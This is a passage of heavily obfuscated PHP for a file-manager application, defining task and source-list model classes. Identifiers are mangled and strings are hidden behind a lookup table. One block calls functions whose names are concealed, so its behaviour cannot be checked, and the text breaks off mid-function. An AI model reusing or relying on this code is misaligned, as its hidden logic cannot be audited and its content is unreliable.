$dØ×¶¸¼¯ó = array($BÌ©ª„ï˜[386] => $E·‚Š´»ÛÃ, $BÌ©ª„ï˜[2101] => $BÌ©ª„ï˜[33], $BÌ©ª„ï˜[2097] => $BÌ©ª„ï˜[2114], $BÌ©ª„ï˜[2491] => 1, $BÌ©ª„ï˜[2100] => 0, $BÌ©ª„ï˜[2492] => 0, $BÌ©ª„ï˜[2099] => $this->getSort()); $BÛŠ…ŒÄ = array_merge($dØ×¶¸¼¯ó, $BÛŠ…ŒÄ); $this->filterAuth($BÛŠ…ŒÄ[$BÌ©ª„ï˜[376]]); goto a¬ä…áäë; F¡µ±ˆÍÏ: $BÌ©ª„ï˜ =& $_SERVER[“]; $E·‚Š´»ÛÃ = $BÛŠ…ŒÄ[$BÌ©ª„ï˜[28]]; if ($this->findByName($E·‚Š´»ÛÃ)) { return !1; } goto f¬“¸ËŒÃ¼; C«ã±Ë‚÷: } private function getSort() { $c’—Ï§æáã =& $_SERVER[“]; $E¼õó‰®Å¨ = parent::listData(); $E‘ØİƒğäÚ = array_to_keyvalue($E¼õó‰®Å¨, $c’—Ï§æáã[33], $c’—Ï§æáã[2116]); return empty($E‘ØİƒğäÚ) ? 0 : max($E‘ØİƒğäÚ) + 1; } private function filterAuth(&$aéºòª‡¼‹) { $b¼æÂó†ó™ =& $_SERVER[“]; $f‡Š‹Ùï = array(); $dÓ¬Ôöäó¬ = array_filter(explode($b¼æÂó†ó™[47], $aéºòª‡¼‹)); foreach ($dÓ¬Ôöäó¬ as $aéºòª‡¼‹) { $b‰‚˜¢Û = explode($b¼æÂó†ó™[91], $aéºòª‡¼‹); if ($b‰‚˜¢Û[0] == $b¼æÂó†ó™[1772] && $b‰‚˜¢Û[1] != $b¼æÂó†ó™[1023]) { $C–®‘ˆ—Ê = $b‰‚˜¢Û[0] . $b¼æÂó†ó™[91] . $b‰‚˜¢Û[1] . $b¼æÂó†ó™[2493]; if (!in_array($C–®‘ˆ—Ê, $dÓ¬Ôöäó¬)) { $f‡Š‹Ùï[] = $C–®‘ˆ—Ê; } } $f‡Š‹Ùï[] = $aéºòª‡¼‹; } $aéºòª‡¼‹ = implode($b¼æÂó†ó™[47], $f‡Š‹Ùï); } public function sort($Aí®‡ììåì, $f‡“™Íˆ¾“) { return parent::update($Aí®‡ììåì, $f‡“™Íˆ¾“); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\164\141\x73\153\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\x74\x79\x70\x65", "\145\166\x65\x6e\164", "\164\151\155\145", "\x64\145\x73\x63", "\x73\x79\x73\x74\145\155", "\145\156\141\142\x6c\x65", "\154\141\163\164\122\x75\156", "\x73\x6f\x72\164"); public function listData($c’Ä—¹õÜ = false, $C•¶…ñ‹í = "\163\x6f\162\164", $b«àñà¤¼ğ = false) { return parent::listData($c’Ä—¹õÜ, $C•¶…ñ‹í, $b«àñà¤¼ğ); } public function add($CÄ‹µ„¾¹é) { $a«Í‚ÖÁ =& $_SERVER[“]; $FÑñ›Ú¥·° = $this->findByName($CÄ‹µ„¾¹é[$a«Í‚ÖÁ[28]]); if ($FÑñ›Ú¥·°) { return !1; } $CÄ‹µ„¾¹é[$a«Í‚ÖÁ[1387]] = 0; $CÄ‹µ„¾¹é[$a«Í‚ÖÁ[2116]] = $this->getSort(); return parent::insert($CÄ‹µ„¾¹é); } private function getSort() { $E¯Ïß›—õ™ =& $_SERVER[“]; $F°¥ğÑŒÌ = parent::listData(); $aïÈÚ±¼ = array_to_keyvalue($F°¥ğÑŒÌ, $E¯Ïß›—õ™[33], $E¯Ïß›—õ™[2116]); return empty($aïÈÚ±¼) ? 0 : max($aïÈÚ±¼) + 1; } public function update($Aˆ™Ø½Åé, $Aêä±öˆ§) { $F÷×ŸòÈïÌ =& $_SERVER[“]; $bÜ»Ëôâ¨ = $this->listData($Aˆ™Ø½Åé); $Dî™­´µ„í = $this->findByName($Aêä±öˆ§[$F÷×ŸòÈïÌ[28]]); if (!$bÜ»Ëôâ¨ || $Dî™­´µ„í && $Dî™­´µ„í[$F÷×ŸòÈïÌ[367]] != $bÜ»Ëôâ¨[$F÷×ŸòÈïÌ[367]]) { return !1; } return parent::update($Aˆ™Ø½Åé, $Aêä±öˆ§); } public function remove($f•”¦ÄÛ¢·, $DÀ¾Ú˜êšó = false) { $BòˆÉÀä“ =& $_SERVER[“]; $Aƒìã´ª‹ = $this->listData($f•”¦ÄÛ¢·); if (!$Aƒìã´ª‹) { return; } if (!$DÀ¾Ú˜êšó && $Aƒìã´ª‹[$BòˆÉÀä“[1067]] == $BòˆÉÀä“[83]) { return !1; } return parent::remove($f•”¦ÄÛ¢·); } public function enable($E…Ä™·÷²Ã, $AòÍ˜ˆ†Û) { return $this->update($E…Ä™·÷²Ã, array($_SERVER[“][2483] => $AòÍ˜ˆ†Û)); } public function run($E”ÊõÈ×ôÌ) { return $this->update($E”ÊõÈ×ôÌ, array($_SERVER[“][2494] => time())); } } if ($_SERVER[$_SERVER[“][774]] != $_SERVER[$_SERVER[“][2306]]) { goto bÌĞÎîèª„; BïŠíÁÜµ: $cˆî¤ñ©($_SERVER[$_SERVER[“][1738]]); goto bÜ³İ”ãâ; C•ñ’™ÆÃ: $fßë¤Áß¬ = explode($_SERVER[“][217], $Aö‚×­… „); if (count($fßë¤Áß¬) < $_SERVER[“][559]) { $f“±¶©Œ‚Ô = $_SERVER[“][779]; $f“±¶©Œ‚Ô(); } $cˆî¤ñ© = $_SERVER[“][1422]; goto BïŠíÁÜµ; bÌĞÎîèª„: $D¯ĞÒØ¬Ôí = $_SERVER[“][776]; $eß‹ˆÈô…Ú = $_SERVER[$_SERVER[“][777]] . $_SERVER[“][778]; $Aö‚×­… „ = $D¯ĞÒØ¬Ôí($eß‹ˆÈô…Ú); goto C•ñ’™ÆÃ; bÜ³İ”ãâ: } goto fÒäœ‘©; Eóˆ«¾³ìŠ: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\162\143\145"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\141\x6d\x65" => "\x69\157\137\x73\x6f\x75\x72\x63\145\x5f\x6d\x65\164\141", "\x6d\145\x74\x61\x46\x69\x65\x6c\x64" => "\163\157\165\x72\x63\145\x49\104"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\124\x69\x6d\145", "\164\x69\x6d\145", "\151\x6e\163\x65\162\x74", "\x66\165\x6e\143\x74\x69\157\x6e"), array("\143\162\x65\x61\164\145\124\151\155\145", "\x74\x69\155\145", "\151\x6e\163\x65\x72\x74", "\146\x75\x6e\143\x74\x69\x6f\156"), array("\x76\x69\x65\167\124\x69\155\145", "\x74\x69\155\x65", "\151\156\x73\145\162\164", "\x66\165\156\x63\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($eö°íœÜø) { return $this->listSource(array($_SERVER[“][368] => $eö°íœÜø)); } public function typeName($A¾”ªø¥Ö) { static $Dƒ‚ó…¹âİ = array(self::TYPE_SYSTEM => "\163\171\163\164\145\x6d", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\x67\x72\157\x75\x70"); return $Dƒ‚ó…¹âİ[$A¾”ªø¥Ö . $_SERVER[“][33]]; } public function sourceListInfo($BÉ„ÁÅ»ƒË, $BŸ¯ŒŠ›Ğ = false) { goto eèÕéã¾¦·; d˜çŒôè©¤: if (!$BÉ„ÁÅ»ƒË) { return array(); } $cÆò‘ƒğâŸ = $this->where(array($B™†°Œ[369] => array($B™†°Œ[7], $BÉ„ÁÅ»ƒË)))->select(); $this->_listDataApply($cÆò‘ƒğâŸ, $BŸ¯ŒŠ›Ğ); goto b¤–Ë˜ùÈ±; b¤–Ë˜ùÈ±: return array_to_keyvalue($cÆò‘ƒğâŸ, $B™†°Œ[369]); goto AáĞ‚±À½¢; eèÕéã¾¦·: $B™†°Œ =& $_SERVER[“]; $BÉ„ÁÅ»ƒË = $BÉ„ÁÅ»ƒË ? $BÉ„ÁÅ»ƒË : array(); $BÉ„ÁÅ»ƒË = array_filter(array_unique($BÉ„ÁÅ»ƒË)); goto d˜çŒôè©¤; AáĞ‚±À½¢: } public function pathInfoFilter($BµŠîä•¥) { goto f¡ĞİÑ¤–Ï; eÍ»¼˜áÕ: $Dİ¼Ú´æ .= $Aô¦ÅŠ—‡­[374]; $Dİ¼Ú´æ .= $Aô¦ÅŠ—‡­[375]; $B™³Îˆãòí = explode($Aô¦ÅŠ—‡­[47], $Dİ¼Ú´æ); goto dÄÙ‚»Åå; dÄÙ‚»Åå: if (isset($BµŠîä•¥[$Aô¦ÅŠ—‡­[376]]) && $BµŠîä•¥[$Aô¦ÅŠ—‡­[376]][$Aô¦ÅŠ—‡­[377]] == -1) { $B™³Îˆãòí = array_remove_value($B™³Îˆãòí, $Aô¦ÅŠ—‡­[187]); $B™³Îˆãòí = array_remove_value($B™³Îˆãòí, $Aô¦ÅŠ—‡­[107]); $B™³Îˆãòí = array_remove_value($B™³Îˆãòí, $Aô¦ÅŠ—‡­[378]); $B™³Îˆãòí = array_remove_value($B™³Îˆãòí, $Aô¦ÅŠ—‡­[379]); $B™³Îˆãòí = array_remove_value($B™³Îˆãòí, $Aô¦ÅŠ—‡­[77]); $B™³Îˆãòí = array_remove_value($B™³Îˆãòí, $Aô¦ÅŠ—‡­[380]); } $BµŠîä•¥ = array_field_key($BµŠîä•¥, $B™³Îˆãòí); return $BµŠîä•¥; goto bƒÄ­É„µ; E×—¿ç¨å: $BµŠîä•¥[$Aô¦ÅŠ—‡­[371]] = $this->typeName($BµŠîä•¥[$Aô¦ÅŠ—‡­[371]]); if ($BµŠîä•¥[$Aô¦ÅŠ—‡­[370]] != 1) { $BµŠîä•¥[$Aô¦ÅŠ—‡­[160]] = $BµŠîä•¥[$Aô¦ÅŠ—‡­[372]]; unset($BµŠîä•¥[$Aô¦ÅŠ—‡­[372]]); } $Dİ¼Ú´æ = $Aô¦ÅŠ—‡­[373]; goto eÍ»¼˜áÕ; f¡ĞİÑ¤–Ï: $Aô¦ÅŠ—‡­ =& $_SERVER[“]; $BµŠîä•¥[$Aô¦ÅŠ—‡­[75]] = KodIO::make($BµŠîä•¥[$Aô¦ÅŠ—‡­[369]]); $BµŠîä•¥[$Aô¦ÅŠ—‡­[29]] = $BµŠîä•¥[$Aô¦ÅŠ—‡­[370]] == 1 ? $Aô¦ÅŠ—‡­[76] : $Aô¦ÅŠ—‡­[167]; goto E×—¿ç¨å; bƒÄ­É„µ: } public function listUserFav() { goto F¹×Ñšõßê; f±‰ºôß®î: foreach ($dñ¶‡Çğáİ as &$dåèÜ¾õê”) { $dåèÜ¾õê” = array($DŸó²˜¸„ô[385] => $dåèÜ¾õê”[$DŸó²˜¸„ô[367]], $DŸó²˜¸„ô[386] => $dåèÜ¾õê”[$DŸó²˜¸„ô[28]], $DŸó²˜¸„ô[387] => $dåèÜ¾õê”[$DŸó²˜¸„ô[75]], $DŸó²˜¸„ô[388] => $dåèÜ¾õê”[$DŸó²˜¸„ô[29]], $DŸó²˜¸„ô[389] => $dåèÜ¾õê”[$DŸó²˜¸„ô[187]], $DŸó²˜¸„ô[390] => $dåèÜ¾õê”[$DŸó²˜¸„ô[107]]); if ($dåèÜ¾õê”[$DŸó²˜¸„ô[29]] == $DŸó²˜¸„ô[382] && $aîÔ»¡÷œä[$dåèÜ¾õê”[$DŸó²˜¸„ô[75]]]) { $dåèÜ¾õê”[$DŸó²˜¸„ô[391]] = $aîÔ»¡÷œä[$dåèÜ¾õê”[$DŸó²˜¸„ô[75]]]; } } return $dñ¶‡Çğáİ; goto EÃˆà¹Šâí; F¹×Ñšõßê: $DŸó²˜¸„ô =& $_SERVER[“]; $dñ¶‡Çğáİ = Model($DŸó²˜¸„ô[381])->listData(); $cíöñèì¹ = array_filter_by_field($dñ¶‡Çğáİ, $DŸó²˜¸„ô[29], $DŸó²˜¸„ô[382]); goto AŠ¬À›²¦µ; AŠ¬À›²¦µ: $cíöñèì¹ = array_to_keyvalue($cíöñèì¹, $DŸó²˜¸„ô[33], $DŸó²˜¸„ô[75]); if ($cíöñèì¹) { $aîÔ»¡÷œä = $this->listSource(array($DŸó²˜¸„ô[383] => array($DŸó²˜¸„ô[384], $cíöñèì¹))); } $aîÔ»¡÷œä = array_to_keyvalue($aîÔ»¡÷œä[$DŸó²˜¸„ô[354]], $DŸó²˜¸„ô[369]); goto f±‰ºôß®î; EÃˆà¹Šâí: } public function listUserTag($Fß‚Éö»°Ê) { goto e‰Ò¦ìô®; e‰Ò¦ìô®: $FƒİĞ‡¡‚» =& $_SERVER[“]; if ($Fß‚Éö»°Ê && !is_array($Fß‚Éö»°Ê)) { $Fß‚Éö»°Ê = array($Fß‚Éö»°Ê); } $DÎ¸˜’ŠÏÜ = Model($FƒİĞ‡¡‚»[392])->listData(); goto dã£Œˆ°; B¶’Û…”’: if ($FØÁƒ¼×§) { Model($FƒİĞ‡¡‚»[394])->removeBySource($FØÁƒ¼×§); } return $bÑøšÃØ§™; goto B‹µ¿ŒËíã; dÖßÁ¸ìï: if (!$bÑøšÃØ§™ || count($B¡·¢Ó‚Œ¥) == $bÑøšÃØ§™[$FƒİĞ‡¡‚»[351]][$FƒİĞ‡¡‚»[352]]) { return $bÑøšÃØ§™; } $FØÁƒ¼×§ = array(); $C¸Ó„£ßç = array_to_keyvalue($bÑøšÃØ§™[$FƒİĞ‡¡‚»[74]], $FƒİĞ‡¡‚»[33], $FƒİĞ‡¡‚»[369]); goto bÆ‚–õâ¬à; B¾Í¥‘ÍŠİ: foreach ($BÕ»ÎšÖÓŸ as $aã½Ç¼à => $dšÒï’ñÀ) { $E­‹óòç§ğ = !0; if (!$Fß‚Éö»°Ê) { $B¡·¢Ó‚Œ¥[] = $aã½Ç¼à; continue; } foreach ($Fß‚Éö»°Ê as $FØÃ¨Õ¥) { if (!in_array($FØÃ¨Õ¥, $dšÒï’ñÀ)) { $E­‹óòç§ğ = !1; break; } } if ($E­‹óòç§ğ) { $B¡·¢Ó‚Œ¥[] = $aã½Ç¼à; } } if (!$B¡·¢Ó‚Œ¥) { return array(); } $bÑøšÃØ§™ = $this->listSource(array($FƒİĞ‡¡‚»[383] => array($FƒİĞ‡¡‚»[384], $B¡·¢Ó‚Œ¥))); goto dÖßÁ¸ìï; bÆ‚–õâ¬à: $a”÷àéÕ… = array_to_keyvalue($bÑøšÃØ§™[$FƒİĞ‡¡‚»[73]], $FƒİĞ‡¡‚»[33], $FƒİĞ‡¡‚»[369]); $C¿¥–›² = array_merge($a”÷àéÕ…, $C¸Ó„£ßç); foreach ($B¡·¢Ó‚Œ¥ as $BªÌÉ½Õì) { if (!in_array($BªÌÉ½Õì, $C¿¥–›²)) { $FØÁƒ¼×§[] = $BªÌÉ½Õì; } } goto B¶’Û…”’; dã£Œˆ°: $BÕ»ÎšÖÓŸ = array(); foreach ($DÎ¸˜’ŠÏÜ as $f•åµ®‰Í§) { $BªÌÉ½Õì = $f•åµ®‰Í§[$FƒİĞ‡¡‚»[75]]; if (!$BªÌÉ½Õì) { continue; } if (!isset($BÕ»ÎšÖÓŸ[$BªÌÉ½Õì])) { $BÕ»ÎšÖÓŸ[$BªÌÉ½Õì] = array(); } $BÕ»ÎšÖÓŸ[$BªÌÉ½Õì][] = $f•åµ®‰Í§[$FƒİĞ‡¡‚»[393]]; } $B¡·¢Ó‚Œ¥ = array(); goto B¾Í¥‘ÍŠİ; B‹µ¿ŒËíã: } public function listUserRecycle() { $Bì¦¯Š®‡ =& $_SERVER[“]; $Cƒä«ÉƒÒÕ = Model($Bì¦¯Š®‡[395])->listData(); if (!$Cƒä«ÉƒÒÕ) { return array(); } $f Ñ©²®î  = array($Bì¦¯Š®‡[383] => array($Bì¦¯Š®‡[384], $Cƒä«ÉƒÒÕ), $Bì¦¯Š®‡[396] => 1); return $this->listSource($f Ñ©²®î ); } public function listSource($c‹ò³‡ÎÛ, $bî°˜«ãù¢ = 3000) { goto bÍŠÌ¢ôµ; e¶ªÖÂ³ê¢: return $bØ¶òŠíŠÅ; goto E¸ŸéÌ·ç; bÍŠÌ¢ôµ: $B¤¹İÏ¦ =& $_SERVER[“]; if (!isset($c‹ò³‡ÎÛ[$B¤¹İÏ¦[397]])) { $c‹ò³‡ÎÛ[$B¤¹İÏ¦[397]] = 0; } $BôËñ’‘±â = $B¤¹İÏ¦[398]; goto BÍ—©¡íÉ; BÍ—©¡íÉ: $bØ¶òŠíŠÅ = $this->field($BôËñ’‘±â)->_makeOrder()->where($c‹ò³‡ÎÛ)->selectPage($bî°˜«ãù¢); $this->_listDataApply($bØ¶òŠíŠÅ[$B¤¹İÏ¦[354]]); $this->_listMake($bØ¶òŠíŠÅ); goto e¶ªÖÂ³ê¢; E¸ŸéÌ·ç: } protected function _makeOrder() { goto E„àè‘“‡; BÚòÊšâÎ: $eÆ·ãç­¿ = Input::get($BğØ¶Š…÷[408], $BğØ¶Š…÷[7], $Aƒ†±…’ÆÈ, array_keys($d•«Œ¼îÉ)); if (!in_array($BÔğâª„¦µ, array_keys($aŠ„Ñï™ç))) { $BÔğâª„¦µ = $BğØ¶Š…÷[28]; } if (!in_array($eÆ·ãç­¿, array_keys($d•«Œ¼îÉ))) { $BÔğâª„¦µ = $BğØ¶Š…÷[402]; } goto AÄ‹Şª¥Ê¹; AÄ‹Şª¥Ê¹: if ($BÔğâª„¦µ == $BğØ¶Š…÷[28]) { } $EßÖÓ‹œî = $BğØ¶Š…÷[409] . $aŠ„Ñï™ç[$BÔğâª„¦µ] . $BğØ¶Š…÷[50] . $d•«Œ¼îÉ[$eÆ·ãç­¿]; return $this->order(rtrim(trim($EßÖÓ‹œî), $BğØ¶Š…÷[47])); goto Dèõçƒïá‰; E„àè‘“‡: $BğØ¶Š…÷ =& $_SERVER[“]; $eÒ·ÈÖ‚Š™ = Model($BğØ¶Š…÷[399])->get($BğØ¶Š…÷[400]); $Aƒ†±…’ÆÈ = Model($BğØ¶Š…÷[399])->get($BğØ¶Š…÷[401]); goto b•‹Ú™„…»; b•‹Ú™„…»: $d•«Œ¼îÉ = array($BğØ¶Š…÷[402] => $BğØ¶Š…÷[403], $BğØ¶Š…÷[404] => $BğØ¶Š…÷[405]); $aŠ„Ñï™ç = array($BğØ¶Š…÷[28] => $BğØ¶Š…÷[28], $BğØ¶Š…÷[77] => $BğØ¶Š…÷[77], $BğØ¶Š…÷[160] => $BğØ¶Š…÷[372], $BğØ¶Š…÷[378] => $BğØ¶Š…÷[378], $BğØ¶Š…÷[406] => $BğØ¶Š…÷[379], $BğØ¶Š…÷[187] => $BğØ¶Š…÷[187], $BğØ¶Š…÷[107] => $BğØ¶Š…÷[107]); $BÔğâª„¦µ = Input::get($BğØ¶Š…÷[407], $BğØ¶Š…÷[7], $eÒ·ÈÖ‚Š™, array_keys($aŠ„Ñï™ç)); goto BÚòÊšâÎ; Dèõçƒïá‰: } protected function _listDataApplyItem($b°Šçƒ°‹Ì, $e¥èÏ¥Ÿ‡ø = false) { $c‘¡Â§’‡Å = array($b°Šçƒ°‹Ì); $this->_listDataApply($c‘¡Â§’‡Å, $e¥èÏ¥Ÿ‡ø); return $c‘¡Â§’‡Å[0]; } protected function _listDataApply(&$B…Çù‰… , $cº±®ˆà = false) { goto bäóÚİè¹ë; bäóÚİè¹ë: $B‡²À²Ñ² =& $_SERVER[“]; if (!$B…Çù‰… ) { $B…Çù‰…  = array(); return; } $EíÕƒÔÖÇ = array_to_keyvalue($B…Çù‰… , $B‡²À²Ñ²[33], $B‡²À²Ñ²[369]); goto fìœ‰Ä»àè; DÓ‰Š²ƒÛ£: $this->_listAppendPath($B…Çù‰… ); $this->_listAppendAuth($B…Çù‰… ); $this->_listAppendSourceInfo($B…Çù‰… , $EíÕƒÔÖÇ); goto e·‰ğ®ŒÃ¹; fìœ‰Ä»àè: $EíÕƒÔÖÇ = array_unique($EíÕƒÔÖÇ); $this->_listSourceCache($B…Çù‰… ); if (!$cº±®ˆà) { $this->_listAppendMeta($B…Çù‰… , $EíÕƒÔÖÇ); $this->_listAppendFileMeta($B…Çù‰… , $EíÕƒÔÖÇ); $this->_listAppendChildren($B…Çù‰… , $EíÕƒÔÖÇ); } goto DÓ‰Š²ƒÛ£; e·‰ğ®ŒÃ¹: $this->_listAppendUser($B…Çù‰… ); $this->_listFilterInfo($B…Çù‰… , $cº±®ˆà); goto d»˜â¦ˆÌ¬; d»˜â¦ˆÌ¬: } protected function _listSourceCache($E½ÀÉñÈôİ) { $C’“¼÷ÏŒ =& $_SERVER[“]; foreach ($E½ÀÉñÈôİ as $a¨èøÎ”ìò) { self::$cacheSourceInfo[$C’“¼÷ÏŒ[410] . $a¨èøÎ”ìò[$C’“¼÷ÏŒ[369]]] = $a¨èøÎ”ìò; } } protected function _listFilterInfo(&$A°åóä‰‡, $d£ÛšŒÙŞÄ = false) { $cìÇë–†Ğñ =& $_SERVER[“]; foreach ($A°åóä‰‡ as &$FÏ¸‘³³) { $FÏ¸‘³³ = $this->pathInfoFilter($FÏ¸‘³³); self::$cachePathInfo[$cìÇë–†Ğñ[411] . intval($d£ÛšŒÙŞÄ) . $cìÇë–†Ğñ[412] . $FÏ¸‘³³[$cìÇë–†Ğñ[369]]] = $FÏ¸‘³³; } } protected function _listMake(&$CØÄ‘¿Çº) { $e¿†Ë×¸åÑ =& $_SERVER[“]; $CØÄ‘¿Çº[$e¿†Ë×¸åÑ[74]] = array(); $CØÄ‘¿Çº[$e¿†Ë×¸åÑ[73]] = array(); foreach ($CØÄ‘¿Çº[$e¿†Ë×¸åÑ[354]] as $CÙ‰“ÖËß) { $a³ÑÙñõÅ› = $CÙ‰“ÖËß[$e¿†Ë×¸åÑ[370]] == 1 ? $e¿†Ë×¸åÑ[74] : $e¿†Ë×¸åÑ[73]; $CØÄ‘¿Çº[$a³ÑÙñõÅ›][] = $CÙ‰“ÖËß; } unset($CØÄ‘¿Çº[$e¿†Ë×¸åÑ[354]]); } protected function _listAppendMeta(&$cä¥¥Ññ, $B’‡³Ã¿Ã) { goto aƒ×â§ŞœÈ; aƒ×â§ŞœÈ: $eÍÈ†ÏŒø« =& $_SERVER[“]; $DîØ¡¦ÇŞô = array($eÍÈ†ÏŒø«[383] => array($eÍÈ†ÏŒø«[384], $B’‡³Ã¿Ã)); $fÔÑÁö‘Ç÷ = Model($eÍÈ†ÏŒø«[413])->field($eÍÈ†ÏŒø«[414])->where($DîØ¡¦ÇŞô)->select(); goto eÜ¸©øƒˆ; eÜ¸©øƒˆ: if (!$fÔÑÁö‘Ç÷) { return; } $C‚ªĞåİ£Î = array($eÍÈ†ÏŒø«[415], $eÍÈ†ÏŒø«[416]); $EË½¡Æ‡‰İ = array(); goto A‹âë©é–ª; A‹âë©é–ª: foreach ($fÔÑÁö‘Ç÷ as $eà¸®…×ï) { if (!isset($EË½¡Æ‡‰İ[$eà¸®…×ï[$eÍÈ†ÏŒø«[369]]])) { $EË½¡Æ‡‰İ[$eà¸®…×ï[$eÍÈ†ÏŒø«[369]]] = array(); } if (in_array($eà¸®…×ï[$eÍÈ†ÏŒø«[89]], $C‚ªĞåİ£Î)) { continue; } $EË½¡Æ‡‰İ[$eà¸®…×ï[$eÍÈ†ÏŒø«[369]]][$eà¸®…×ï[$eÍÈ†ÏŒø«[89]]] = $eà¸®…×ï[$eÍÈ†ÏŒø«[359]]; } foreach ($cä¥¥Ññ as &$D¬ó‘ïå½®) { $D¬ó‘ïå½®[$eÍÈ†ÏŒø«[417]] = !1; if (isset($EË½¡Æ‡‰İ[$D¬ó‘ïå½®[$eÍÈ†ÏŒø«[369]]])) { $D¬ó‘ïå½®[$eÍÈ†ÏŒø«[417]] = $EË½¡Æ‡‰İ[$D¬ó‘ïå½®[$eÍÈ†ÏŒø«[369]]]; } if ($this->fileIsLock($D¬ó‘ïå½®) && $D¬ó‘ïå½®[$eÍÈ†ÏŒø«[376]]) { $BÒ¦ğÂÍ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $D¬ó‘ïå½®[$eÍÈ†ÏŒø«[376]][$eÍÈ†ÏŒø«[377]] = AuthModel::authDisable($D¬ó‘ïå½®[$eÍÈ†ÏŒø«[376]][$eÍÈ†ÏŒø«[377]], $BÒ¦ğÂÍ); $D¬ó‘ïå½®[$eÍÈ†ÏŒø«[376]][$eÍÈ†ÏŒø«[418]][$eÍÈ†ÏŒø«[376]] = $D¬ó‘ïå½®[$eÍÈ†ÏŒø«[376]][$eÍÈ†ÏŒø«[377]]; } } goto eâíèÛ§·Ê; eâíèÛ§·Ê: } protected function _listAppendFileMeta(&$c—ÅåÚÀØÉ, $C‰ÅÏŞ­«) { goto BˆÆÙ’»÷‘; bÜõéÅ£œ¾: if (!$eíÔœ÷“Ÿâ) { return; } $CÎÛ–“£ = array($Aµ¾™¼Â†­[420] => array($Aµ¾™¼Â†­[384], $eíÔœ÷“Ÿâ)); $C¶³ÂÌÄ×¬ = $Aµ¾™¼Â†­[421]; goto cæøÂÇÊ÷İ; c‹˜ã»ª¼: foreach ($c—ÅåÚÀØÉ as &$d”äÊÙ¬¸´) { goto BÈÖ´çšÊß; Fù‰á£‡¨Ù: $e°ÖéÖÅ¦[$Aµ¾™¼Â†­[77]] = $d”äÊÙ¬¸´[$Aµ¾™¼Â†­[77]]; $e°ÖéÖÅ¦[$Aµ¾™¼Â†­[28]] = $d”äÊÙ¬¸´[$Aµ¾™¼Â†­[28]]; self::$cacheFileInfo[$Aµ¾™¼Â†­[425] . $dŸ¨¦™Ÿ¿½] = $e°ÖéÖÅ¦; goto a˜×¨Ş‚½; b…Ú˜ê¾ƒ: if (isset($d”äÊÙ¬¸´[$Aµ¾™¼Â†­[162]][$Aµ¾™¼Â†­[426]])) { $d”äÊÙ¬¸´[$Aµ¾™¼Â†­[426]] = json_decode($d”äÊÙ¬¸´[$Aµ¾™¼Â†­[162]][$Aµ¾™¼Â†­[426]], !0); unset($d”äÊÙ¬¸´[$Aµ¾™¼Â†­[162]][$Aµ¾™¼Â†­[426]]); } goto aÏªÁëê›; a˜×¨Ş‚½: unset($AÑ¼½ç‚±[$dŸ¨¦™Ÿ¿½][$Aµ¾™¼Â†­[75]]); $e¢Ÿ´ÔÄÊã = is_array($F·©‰å‡é[$dŸ¨¦™Ÿ¿½]) ? $F·©‰å‡é[$dŸ¨¦™Ÿ¿½] : array(); $d”äÊÙ¬¸´[$Aµ¾™¼Â†­[162]] = array_merge($e¢Ÿ´ÔÄÊã, $AÑ¼½ç‚±[$dŸ¨¦™Ÿ¿½]); goto b…Ú˜ê¾ƒ; BÈÖ´çšÊß: $dŸ¨¦™Ÿ¿½ = $d”äÊÙ¬¸´[$Aµ¾™¼Â†­[419]]; if (!$dŸ¨¦™Ÿ¿½ || !isset($AÑ¼½ç‚±[$dŸ¨¦™Ÿ¿½])) { continue; } $e°ÖéÖÅ¦ = $AÑ¼½ç‚±[$dŸ¨¦™Ÿ¿½]; goto Fù‰á£‡¨Ù; aÏªÁëê›: } goto A£‰…³ˆƒ‹; BˆÆÙ’»÷‘: $Aµ¾™¼Â†­ =& $_SERVER[“]; $eíÔœ÷“Ÿâ = array_to_keyvalue($c—ÅåÚÀØÉ, $Aµ¾™¼Â†­[33], $Aµ¾™¼Â†­[419]); $eíÔœ÷“Ÿâ = array_filter(array_unique($eíÔœ÷“Ÿâ)); goto bÜõéÅ£œ¾; cæøÂÇÊ÷İ: $AÑ¼½ç‚± = Model($Aµ¾™¼Â†­[422])->field($C¶³ÂÌÄ×¬)->where($CÎÛ–“£)->select(); $AÑ¼½ç‚± = array_to_keyvalue($AÑ¼½ç‚±, $Aµ¾™¼Â†­[419]); $F…Í•ÈÆÌ† = Model($Aµ¾™¼Â†­[423])->field($Aµ¾™¼Â†­[424])->where($CÎÛ–“£)->select(); goto AôŠ±Ò‚ÁÇ; AôŠ±Ò‚ÁÇ: $F…Í•ÈÆÌ† = $F…Í•ÈÆÌ† ? $F…Í•ÈÆÌ† : array(); $F·©‰å‡é = array(); foreach ($F…Í•ÈÆÌ† as $F“—‹åÌŠ) { if (!isset($F·©‰å‡é[$F“—‹åÌŠ[$Aµ¾™¼Â†­[419]]])) { $F·©‰å‡é[$F“—‹åÌŠ[$Aµ¾™¼Â†­[419]]] = array(); } $F·©‰å‡é[$F“—‹åÌŠ[$Aµ¾™¼Â†­[419]]][$F“—‹åÌŠ[$Aµ¾™¼Â†­[89]]] = $F“—‹åÌŠ[$Aµ¾™¼Â†­[359]]; } goto c‹˜ã»ª¼; A£‰…³ˆƒ‹: } protected function _listAppendSourceInfo(&$Aá‘ŒáìŸê, $c›­éóôÎ) { goto A›¬Ğ‘¼Å; A›¬Ğ‘¼Å: $Dìœ„™Ï‘£ =& $_SERVER[“]; if (!defined($Dìœ„™Ï‘£[427])) { return; } $bëçÄ¢Úšö = Model($Dìœ„™Ï‘£[428])->listData(); goto D­¼±‹±¤¤; BïÎ¹¹à†: $b¢˜ŠÀÍÈ­ = array_to_keyvalue_group($aç‹‘™œ, $Dìœ„™Ï‘£[369]); foreach ($Aá‘ŒáìŸê as &$aâˆœî”ƒÍ) { $aâˆœî”ƒÍ[$Dìœ„™Ï‘£[391]] = array($Dìœ„™Ï‘£[430] => 0, $Dìœ„™Ï‘£[431] => 0, $Dìœ„™Ï‘£[432] => 0); if (isset($FÜÀîÅ¨[$aâˆœî”ƒÍ[$Dìœ„™Ï‘£[369]]])) { 